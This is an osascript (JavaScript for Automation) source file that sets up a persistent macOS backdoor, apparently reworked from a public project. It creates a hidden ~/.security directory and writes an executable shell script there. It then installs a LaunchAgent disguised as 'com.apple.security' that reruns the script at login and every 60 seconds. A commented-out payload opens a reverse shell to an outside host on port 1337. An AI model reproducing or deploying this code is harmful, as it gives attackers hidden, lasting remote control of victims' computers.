//#!/usr/bin/env osascript -l JavaScript
// Rework of mosca1337's work:
// https://github.com/mosca1337/OSX-Peristant-BackDoor/blob/master/setup.bash
//Take in command line argument for the command to execute

//Payload to execute 
//CHANGE THIS FOR DESIRED PAYLOAD !!!!
var payload = `echo "'ps' > $HOME/test.txt" > $HOME/.security/system.sh`
/* 
var payload = `echo "#!/bin/bash
bash -i >& /dev/tcp/my.site.here.com/1337 0>&1
wait" > $HOME/.security/system.sh`
*/

//Malicious plist
var plist = 
`'<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>com.apple.security</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>'$HOME'/.security/system.sh</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>StartInterval</key>
        <integer>60</integer>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>'`

ObjC.import('Foundation')
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true; 

//Create the hidden directory if it doesn't already exist

var userHome = app.doShellScript("echo $HOME")
var hiddenPath = userHome + "/.security"
isDir=Ref()
var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath,isDir)
if (hiddenDirectoryExistsCheck == false) {
	console.log("Creating hidden directory...");
	app.doShellScript("mkdir $HOME/.security")
					}

//Create the malicious script which is saved to "$HOME/.security/system.sh"
console.log("Creating malicious script...");
app.doShellScript(payload);

//Give the script permission to execute
app.doShellScript("chmod +x $HOME/.security/system.sh");

//Create user Launch Agent directory if it doesn't already exist
var lauchagentPath = userHome + "/Library/LaunchAgents"
var launchDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(lauchagentPath,isDir)
if (launchDirectoryExistsCheck == false) {
	app.doShellScript("mkdir $HOME/Library/LaunchAgents")
					}
//Write the .plist to LaunchAgents
app.doShellScript("echo" + " " + plist + " " + " > $HOME/Library/LaunchAgents/com.apple.security.plist");

//Load the LaunchAgent
app.doShellScript("launchctl load $HOME/Library/LaunchAgents/com.apple.security.plist");
